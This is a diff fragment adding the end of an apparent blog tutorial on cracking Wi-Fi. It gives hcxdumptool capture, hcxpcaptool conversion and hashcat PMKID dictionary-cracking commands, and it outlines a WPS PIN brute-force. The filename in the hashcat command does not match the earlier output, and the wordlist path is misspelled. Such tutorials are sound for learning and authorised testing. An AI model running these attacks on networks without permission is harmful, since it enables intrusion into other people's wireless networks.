+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hcxdumptool -i &lt;IFACE&gt; -o &lt;OUT_FILE&gt; --enable_status=1
+</code></pre></div></div>
+
+<h3 id="export-results-fo-hashcat--cr4ck-it">Export results fo hashcat &amp;&amp; Cr4ck it!</h3>
+
+<p>Using <code class="highlighter-rouge">hcxpcaptool</code> we can easily transform the output of bettercap or hcxdumptool to hashcat.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hcxpcaptool -z hashes.hash Capture.pcap
+
+hashcat -m 16800 -d 1 -w 3 hashesh.hash /usr/share/wordslist/rockyou.txt
+</code></pre></div></div>
+
+<h2 id="wps-attack">WPS Attack</h2>
+
+<p>Wifi Protected Setup aka WPS is a wireless network security standard that tries to make connections between a router and devices faster and easier.</p>
+
+<p><code class="highlighter-rouge">WPSPinGenerator</code> is an automatic tool available in <code class="highlighter-rouge">Wifislax</code>.</p>
+
+<p>First we need to choose the interface to work with and the channels where we want to listen. We can see the generic PINS if they are available on the network by selection the suitable SSID.</p>
+
+<p>Finally we just need to test the PIN and wait for success. Noticed that after 3 fail attempts the WPS could lock.</p>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
